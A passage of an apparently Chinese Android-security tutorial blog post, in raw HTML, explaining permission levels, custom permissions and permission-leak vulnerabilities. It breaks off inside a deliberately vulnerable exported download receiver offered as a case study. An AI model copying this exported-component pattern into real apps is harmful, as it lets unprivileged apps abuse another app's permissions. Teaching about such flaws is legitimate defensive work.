title=\"一、前言\"></a>一、前言</h2><p>前几篇帖子我们将Android的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍Android中的权限配置相关的漏洞以及Android安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。</p>\n<span id=\"more\"></span>\n<p>本文第二节主要讲述Android权限机制，以及Android中权限所涉及的安全问题</p>\n<p>本文第三节主要讲述权限安全漏洞的原理和拿两个案例复现相关的权限漏洞，并给出了相应的防护方案</p>\n<p>本文第四节主要介绍Android中的安全配置问题，梳理了AndroidManifest.xml的结构注册，并讲解了相关的配置安全问题</p>\n<p>本文第五节主要复现和详细介绍了Android安全配置中的漏洞问题</p>\n<h2 id=\"二、Android权限机制介绍\"><a href=\"#二、Android权限机制介绍\" class=\"headerlink\" title=\"二、Android权限机制介绍\"></a>二、Android权限机制介绍</h2><h3 id=\"1-Android权限\"><a href=\"#1-Android权限\" class=\"headerlink\" title=\"1. Android权限\"></a>1. Android权限</h3><h4 id=\"（1）Android权限原理\"><a href=\"#（1）Android权限原理\" class=\"headerlink\" title=\"（1）Android权限原理\"></a>（1）Android权限原理</h4><p>Android设置权限主要是为了保护Android用户的隐私，根据功能不同，系统会授予不同的权限，而对于用户的一些敏感数据，用户必须要申请权限之后才能访问，具体的示意图如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/1.png\" alt=\"image-20211025162212783\"></p>\n<h4 id=\"（2）Android权限的分类\"><a href=\"#（2）Android权限的分类\" class=\"headerlink\" title=\"（2）Android权限的分类\"></a>（2）Android权限的分类</h4><p>从官方的文档中，我们可以知道Android将权限分为：<code>安装时权限、运行时权限和特殊权限</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)安装时权限：用户在安装应用程序时，应用程序会向用户申请的基本权限，这类权限一般被分配为：普通权限和签名权限</span><br><span class=\"line\">(<span class=\"number\">2</span>)运行时权限：Android6<span class=\"number\">.0</span>之后，Android中加入了运行时权限，应用程序在运行过程中需要访问一些敏感数据，需要向用户请求权限，这类权限被分配为：危险权限</span><br><span class=\"line\">(<span class=\"number\">3</span>)特殊权限：只有平台和原始设备制造商（OEM）可以定义，为了执行特定的操作而申请的权限，这类权限被分配为：保护权限</span><br></pre></td></tr></table></figure>\n\n<p>我们从上文中可以知道Android 6.0是一个重要节点，所以下面我们以此为界详细的描述权限的变化情况，权限的API参考：<a href=\"https://developer.android.com/reference/android/Manifest.permission?hl=zh-cn\">权限API列表</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/2.png\" alt=\"image-20211025170220085\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">危险权限的处理：</span><br><span class=\"line\">（1）Android 6.0之前应用程序会在程序安装时申请全部危险权限，一些应用可能用户不授权就无法成功安装，存在很大的安全风险</span><br><span class=\"line\">（2）Android 6.0之后应用程序在使用危险权限时，需要向用户动态申请</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">正常权限：manifest文件声明即可使用，安装apk时授予，app运行时不在提示</span><br><span class=\"line\">危险权限：涉及到用户隐私，用户数据相关的权限，manifest声明，代码中还要动态申请</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）权限组\"><a href=\"#（3）权限组\" class=\"headerlink\" title=\"（3）权限组\"></a>（3）权限组</h4><p>Android系统对所有的<code>危险权限</code>进行了分组，称为权限组</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"><strong>权限组</strong></th>\n<th>权限</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">CALENDAR</td>\n<td>READ_CALENDAR<br/>WRITE_CALENDAR</td>\n</tr>\n<tr>\n<td align=\"left\">CAMERA</td>\n<td>CAMERA</td>\n</tr>\n<tr>\n<td align=\"left\">CONTACTS</td>\n<td>READ_CONTACTS<br/>WRITE_CONTACTS<br/>GET_ACCOUNTS</td>\n</tr>\n<tr>\n<td align=\"left\">LOCATION</td>\n<td>ACCESS_FINE_LOCATION<br/>ACCESS_COARSE_LOCATION</td>\n</tr>\n<tr>\n<td align=\"left\">MICROPHONE</td>\n<td>RECORD_AUDIO</td>\n</tr>\n<tr>\n<td align=\"left\">PHONE</td>\n<td>READ_PHONE_STATE<br/>CALL_PHONE<br/>READ_CALL_LOG<br/>WRITE_CALL_LOG<br/>ADD_VOICEMAIL<br/>USE_SIP<br/>PROCESS_OUTGOING_CALLS</td>\n</tr>\n<tr>\n<td align=\"left\">SENSORS</td>\n<td>BODY_SENSORS</td>\n</tr>\n<tr>\n<td align=\"left\">SMS</td>\n<td>SEND_SMS<br/>RECEIVE_SMS<br/>READ_SMS<br/>RECEIVE_WAP_PUSH<br/>RECEIVE_MMS</td>\n</tr>\n<tr>\n<td align=\"left\">STORAGE</td>\n<td>READ_EXTERNAL_STORAGE<br/>WRITE_EXTERNAL_STORAGE</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">权限组的区别：</span><br><span class=\"line\">（1）Android 6.0-8.0：用户只要同意权限组的任意一个权限，用户则会获得此权限组的所有权限</span><br><span class=\"line\">（2）Android 9.0及以后: 用户申请某个组内的一个权限，系统不会给同组内的其他权限，用户申请哪个，系统就给哪个</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）如何请求权限\"><a href=\"#（4）如何请求权限\" class=\"headerlink\" title=\"（4）如何请求权限\"></a>（4）如何请求权限</h4><h5 id=\"lt-1-gt-向清单文件中添加权限\"><a href=\"#lt-1-gt-向清单文件中添加权限\" class=\"headerlink\" title=\"&lt;1&gt;向清单文件中添加权限\"></a>&lt;1&gt;向清单文件中添加权限</h5><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:tools</span>=<span class=\"string\">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">package</span>=<span class=\"string\">&quot;com.ceco.r.gravitybox&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:versionCode</span>=<span class=\"string\">&quot;1105&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:versionName</span>=<span class=\"string\">&quot;11.0.5&quot;</span> &gt;</span></span><br><span class=\"line\">    //声明权限</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.READ_SYNC_SETTINGS&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_SYNC_SETTINGS&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>无论应用需要什么权限，都需要在清单文件中对权限声明，系统会根据权限的等级来采取不同的操作，对不同的权限，系统会在安装应用时立即授予这些权限，对于危险权限，则需要用户明确授权才能获得</p>\n<h5 id=\"lt-2-gt-运行时申请权限\"><a href=\"#lt-2-gt-运行时申请权限\" class=\"headerlink\" title=\"&lt;2&gt;运行时申请权限\"></a>&lt;2&gt;运行时申请权限</h5><p>申请权限的常用步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">权限申请步骤：</span><br><span class=\"line\"><span class=\"number\">1.</span>检查有无权限</span><br><span class=\"line\">\t有权限——&gt;运行</span><br><span class=\"line\">\t无权限——&gt;申请权限</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>申请权限（走权限回调）</span><br><span class=\"line\">\t用户同意——&gt;运行</span><br><span class=\"line\">\t用户拒绝——&gt;展示跳转设置界面对话框</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>跳转设置对话框</span><br><span class=\"line\">\t同意跳转——&gt;跳转特定的权限打开界面</span><br><span class=\"line\">\t用户拒绝——&gt;Toast提示没权限，功能不能正常使用</span><br></pre></td></tr></table></figure>\n\n<p><strong>检查有无权限：</strong></p>\n<p>应用程序需要一项危险权限，每次执行需要危险权限的操作时，都必须检查自己是否具有该权限，Android 6.0开始，用户可以1随时从任何应用撤销权限，即便应用以较低的API为目标平台，检查应用是否具备某项权限，调用<code>ContextCompat.checkSelfPermission()</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ContextCompat.checkSelfPermission方法：检查是否具有某项权限 </span><br><span class=\"line\">参数<span class=\"number\">1</span>：Context 参数<span class=\"number\">2</span>：权限名    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)</span><br><span class=\"line\">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 权限没有被授予</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>申请权限：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ActivityCompat.requestPermissions方法：</span><br><span class=\"line\">参数<span class=\"number\">1</span>：activity  参数<span class=\"number\">2</span>：要申请权限的字符串数组  参数<span class=\"number\">3</span>：请求码</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)</span><br><span class=\"line\">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 权限没有被授予，申请权限</span></span><br><span class=\"line\">        ActivityCompat.requestPermissions(thisActivity,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;Manifest.permission.READ_CONTACTS&#125;,<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）requestPermissions执行时会弹系统对话框申请相关的权限。用户可以选择同意授权，或者拒绝授权。对话框关闭之后就走Activity的onRequestPermissionsResult回调了</span><br><span class=\"line\">（<span class=\"number\">2</span>）请求危险权限，之前需要在清单文件声明，否则对话框不弹，直接就是用户拒绝这个权限</span><br><span class=\"line\">（<span class=\"number\">3</span>）总之，只要使用权限就必须清单文件先声明，只是危险权限还需要动态申请</span><br></pre></td></tr></table></figure>\n\n<p><strong>对话框关闭后，请求回调:</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">onRequestPermissionsResult方法：</span><br><span class=\"line\">参数<span class=\"number\">1</span>：请求码 参数<span class=\"number\">2</span>：请求的权限 参数<span class=\"number\">3</span>：授权结果数组</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onRequestPermissionsResult</span><span class=\"params\">(<span class=\"type\">int</span> requestCode, <span class=\"meta\">@NonNull</span> String[] permissions,</span></span><br><span class=\"line\"><span class=\"params\">            <span class=\"meta\">@NonNull</span> <span class=\"type\">int</span>[] grantResults)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">switch</span>(requestCode)&#123;</span><br><span class=\"line\">            \t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            \t\t<span class=\"keyword\">if</span>(grantResults.length&gt;<span class=\"number\">0</span> &amp;&amp; grantResults[<span class=\"number\">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class=\"line\">                        call();</span><br><span class=\"line\">                    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                        <span class=\"comment\">//你没有授权</span></span><br><span class=\"line\">                        Toast.makeText(<span class=\"string\">&quot;TAG&quot;</span>, <span class=\"string\">&quot;你没有授权！&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">         &#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">回调函数，你授权后就会执行call(),你没有授权就会提示没有权限</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（5）自定义权限\"><a href=\"#（5）自定义权限\" class=\"headerlink\" title=\"（5）自定义权限\"></a>（5）自定义权限</h4><p>Android中应用程序可以自定义权限来提供给其他程序访问自己的功能</p>\n<h5 id=\"lt-1-gt-如何定义自定义权限\"><a href=\"#lt-1-gt-如何定义自定义权限\" class=\"headerlink\" title=\"&lt;1&gt; 如何定义自定义权限\"></a>&lt;1&gt; 如何定义自定义权限</h5><p>我们要定义自定义权限，需要在<code>AndroidManifest.xml</code>中使用<code>&lt;permission&gt;</code>来声明</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">package</span>=<span class=\"string\">&quot;com.example.test&quot;</span> &gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">permission</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.myapp.permission.DEADLY_ACTIVITY&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;@string/permlab_deadlyActivity&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:description</span>=<span class=\"string\">&quot;@string/permdesc_deadlyActivity&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:permissionGroup</span>=<span class=\"string\">&quot;android.permission-group.COST_MONEY&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;dangerous&quot;</span> /&gt;</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">属性说明：</span><br><span class=\"line\">(<span class=\"number\">1</span>)name：自定义权限的名字，其他app引用的名字</span><br><span class=\"line\">(<span class=\"number\">2</span>)lable：标签，用于描述该权限保护的关键功能,显示给用户的，它的值可是一个 string 数据</span><br><span class=\"line\">(<span class=\"number\">3</span>)description：描述，比 label 更长的对权限的描述。值是通过 resource 文件中获取的，不能直接写 string 值。</span><br><span class=\"line\">(<span class=\"number\">4</span>)permissionGroup：权限组，可选属性。在大多数情况下，应该将其设置为一个标准系统组（android.Manifest.permission_group），尽管可以自己定义一个组。</span><br><span class=\"line\">(<span class=\"number\">5</span>)protectionLevel：权限的等级，必须的属性</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-自定义权限使用\"><a href=\"#lt-2-gt-自定义权限使用\" class=\"headerlink\" title=\"&lt;2&gt;自定义权限使用\"></a>&lt;2&gt;自定义权限使用</h5><p>我们先在进程1中定义自定义权限：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;manifest xmlns:android=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">package</span>=<span class=\"string\">&quot;com.example.test&quot;</span>&gt;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//自定义的权限，权限级别为 normal</span></span><br><span class=\"line\">    &lt;permission</span><br><span class=\"line\">        android:name=<span class=\"string\">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span></span><br><span class=\"line\">        android:label=<span class=\"string\">&quot;abc&quot;</span></span><br><span class=\"line\">        android:description=<span class=\"string\">&quot;@string/permdesc_SecondActivity&quot;</span></span><br><span class=\"line\">        android:permissionGroup=<span class=\"string\">&quot;android.permission-group.COST_MONEY&quot;</span></span><br><span class=\"line\">        android:protectionLevel=<span class=\"string\">&quot;normal&quot;</span> /&gt;</span><br><span class=\"line\">            &lt;application</span><br><span class=\"line\">        android:allowBackup=<span class=\"string\">&quot;true&quot;</span></span><br><span class=\"line\">        android:icon=<span class=\"string\">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class=\"line\">        android:label=<span class=\"string\">&quot;@string/app_name&quot;</span></span><br><span class=\"line\">        android:roundIcon=<span class=\"string\">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class=\"line\">        android:supportsRtl=<span class=\"string\">&quot;true&quot;</span></span><br><span class=\"line\">        android:theme=<span class=\"string\">&quot;@style/AppTheme&quot;</span>&gt;</span><br><span class=\"line\">        <span class=\"comment\">//为SecondActivity加上android:permission=&quot;com.example.myapp.permission.SECOND_ACTIVITY&quot;</span></span><br><span class=\"line\">        &lt;activity</span><br><span class=\"line\">            android:name=<span class=\"string\">&quot;.SecondActivity&quot;</span></span><br><span class=\"line\">            android:exported=<span class=\"string\">&quot;true&quot;</span></span><br><span class=\"line\">            android:permission=<span class=\"string\">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span>&gt;</span><br><span class=\"line\">            &lt;intent-filter&gt;</span><br><span class=\"line\">                &lt;action android:name=<span class=\"string\">&quot;com.example.jump&quot;</span> /&gt;</span><br><span class=\"line\">                &lt;category android:name=<span class=\"string\">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class=\"line\">            &lt;/intent-filter&gt;</span><br><span class=\"line\">        &lt;/activity&gt;</span><br><span class=\"line\">\t\t......</span><br><span class=\"line\">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们在进程2中声明该自定义权限：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">package</span>=<span class=\"string\">&quot;com.example.test&quot;</span>&gt;</span></span><br><span class=\"line\">\t//在AndroidManifest中声明权限</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在进程2的MainActivity中编写代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;com.example.jump&quot;</span>);</span><br><span class=\"line\">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (intent.resolveActivity(getPackageManager()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">\tstartActivity(intent);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样我们就可以顺利从进程2跳转到进程1</p>\n<h5 id=\"lt-3-gt-自定义权限注意点\"><a href=\"#lt-3-gt-自定义权限注意点\" class=\"headerlink\" title=\"&lt;3&gt;自定义权限注意点\"></a>&lt;3&gt;自定义权限注意点</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）两个应用声明了相同的权限？</span><br><span class=\"line\">Android不允许两个不同的应用定义一个相同名字的权限（除非这两个应用拥有相同签名），所以最好不要命名相同</span><br><span class=\"line\">（<span class=\"number\">2</span>）应用安装的顺序关系</span><br><span class=\"line\">场景：APP A中声明了权限permission A，APP B中使用了权限permissionA</span><br><span class=\"line\">情况<span class=\"number\">1</span>：PermissionA的保护级别是normal或者dangerous，只能App A先安装，App B后安装，从App B打开App A一切正常，否则报错</span><br><span class=\"line\">情况<span class=\"number\">2</span>：PermissionA的保护级别是signature或者signatureOrSystem</span><br><span class=\"line\">      App B先安装，App A后安装，如果App A和App B是相同的签名，那么App B可以获取到PermissionA的权限</span><br><span class=\"line\">      如果App A和App B的签名不同，则App B获取不到PermissionA权限</span><br><span class=\"line\">      对于相同签名的app来说，不论安装先后，只要是声明了权限，请求该权限的app就会获得该权限</span><br><span class=\"line\">情况<span class=\"number\">3</span>:android:protectionLevel会影响权限在Android6<span class=\"number\">.0</span>+系统的使用</span><br><span class=\"line\">\t android:protectionLevel=<span class=\"string\">&quot;normal&quot;</span>，不需要动态申请 </span><br><span class=\"line\">\t android:protectionLevel=<span class=\"string\">&quot;dangerous&quot;</span>，需要动态申请</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-权限安全种类和危害\"><a href=\"#2-权限安全种类和危害\" class=\"headerlink\" title=\"2.权限安全种类和危害\"></a>2.权限安全种类和危害</h3><p><strong>权限漏洞种类：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/3.png\" alt=\"image-20211026104832302\"></p>\n<p><strong>安全场景：</strong></p>\n<p>我们通过上面的分析，可以发现大部分权限安全的场景都发生在保护级别设置不当，自定义权限中如果权限控制不当，往往就会导致各种越权等安全问题的发生。我们再次看一下自定义权限的结构：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;string&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;string resource&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:description</span>=<span class=\"string\">&quot;string resource&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:permissionGroup</span>=<span class=\"string\">&quot;string&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">[</span>&quot;<span class=\"attr\">normal</span>&quot;|&quot;<span class=\"attr\">dangerous</span>&quot;|&quot;<span class=\"attr\">signature</span>&quot;|&quot;<span class=\"attr\">signatureOrSystem</span>&quot; /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Normal:最低等级，系统会默认授予次权限，不会提示用户，低风险，所以的APP不能访问和共享此APP</span><br><span class=\"line\">Dangerous:系统在安装时声明此类权限的app会提示用户，是高风险，所以APP都能访问和共享此APP</span><br><span class=\"line\">Signature:权限表明的操作只针对使用同一个证书签名的app开放，是指具有相同签名的APP可以访问和共享此APP</span><br><span class=\"line\">SignatureOrSystem:系统images中APP和具有相同签名的APP可以访问和共享此APP,google建议不使用该选项，一般用于特定的一些功能</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、权限安全漏洞原理分析和复现\"><a href=\"#三、权限安全漏洞原理分析和复现\" class=\"headerlink\" title=\"三、权限安全漏洞原理分析和复现\"></a>三、权限安全漏洞原理分析和复现</h2><h3 id=\"1-漏洞原理\"><a href=\"#1-漏洞原理\" class=\"headerlink\" title=\"1.漏洞原理\"></a>1.漏洞原理</h3><p>介绍权限漏洞之前，我们先讲解一下Android组件基本知识，前几篇帖子我们也介绍过，Android程序运行在独立的沙箱环境中，相互隔离，为了方便通信，Android提供了组件间的通信（ICC）机制，允许满足条件的组件相互传递数据，ICC的实现依赖于Intent和Binder机制，其底层是通过进程间通信来实现的。在组件的通信过程中，Intent是数据传播的载体，通信发起方发送Intent，携带执行的动作、动作相关的数据和附加数据等信息，通信接收方预先定义自身的Intent-filter，intent-filter中包含能够响应intent的动作和数据类型，声明能够响应的intent请求，应用程序框架在通信发起Intent后，负责找到能处理该Intent的接收方。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/4.png\" alt=\"image-20211026112045142\"></p>\n<p>组件间通信的一个前提是接收方组件必须公开，Android中的组件分为公开组件和私有组件，具体有export是否可导出决定，而Android权限泄漏漏洞就是由于不合理的公开了组件或者没有对接收的Intent进行合法性校验导致，其表现为将一个拥有权限的API通过公开组件暴露给外界，攻击者可以构造数据访问这个API达到权限提升的效果，一般表现为两个方面：隐私获取和动作执行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">隐私获取：指的是攻击者通过构造数据访问存在权限泄露漏洞的程序组件，并让该组件返回隐私数据，这些数据包括短信消息、联系人信息、地理位置、邮件信息等等</span><br><span class=\"line\">动作执行：指的是攻击者构造数据访问存在权限泄露的程序组件，让该组件执行系统破坏等恶意的操作，例如结束系统服务、拨打电话、删除程序数据等</span><br></pre></td></tr></table></figure>\n\n<p>具体的示意图如下所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/5.png\" alt=\"image-20211026112525986\"></p>\n<p>应用程序B是一个拥有权限P1的应用程序，包含组件C1，C1组件是公开给外界，意为export &#x3D; true，并且C1组件可以访问权限P1对应的系统资源，这样另外一个没有权限P1的应用程序A，可以构造Intent数据去启动应用程序B的C1组件，进而访问到P1权限对应的系统资源，拥有权限P1的应用程序B没有对权限合理的保护，引发了权限泄漏，没有权限P1的应用程序A利用这个漏洞获得了权限，导致了权限泄漏</p>\n<h3 id=\"2-漏洞案例\"><a href=\"#2-漏洞案例\" class=\"headerlink\" title=\"2.漏洞案例\"></a>2.漏洞案例</h3><h4 id=\"（1）下载文件权限泄漏漏洞\"><a href=\"#（1）下载文件权限泄漏漏洞\" class=\"headerlink\" title=\"（1）下载文件权限泄漏漏洞\"></a>（1）下载文件权限泄漏漏洞</h4><p><strong>目标程序：</strong></p>\n<p>配置文件：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">&lt;!--网络--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 读写文件 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.Download&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:enabled</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.down&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>代码段：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Download</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BroadcastReceiver</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(Context context, Intent intent)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> This method is called when the BroadcastReceiver is receiving</span></span><br><span class=\"line\">        <span class=\"comment\">// an Intent broadcast.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(intent.getAction().equals(<span class=\"string\">&quot;com.example.down&quot;</span>))&#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> 